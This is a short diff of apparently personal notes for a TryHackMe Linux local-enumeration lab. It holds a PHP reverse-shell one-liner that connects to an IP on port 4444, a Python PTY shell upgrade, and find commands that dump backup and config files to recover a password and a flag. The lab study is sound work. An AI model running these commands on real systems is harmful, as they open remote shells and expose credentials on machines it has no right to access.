@@ -1,6 +1,15 @@
 php -r '$sock=fsockopen("10.6.88.227",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
+#Task 6 Unit 4 - Find command and interesting files 
+What's the password you found? 
+find / -name *.bak -type f -print | xargs /bin/cat
+
+Did you find a flag?
+find / -name *.conf -type f -print 2>/dev/null
+cat /etc/sysconf/flag.conf
+
+
 
 https://tryhackme.com/room/lle
 http://related.cupprs.com/linux-local-enumeration/
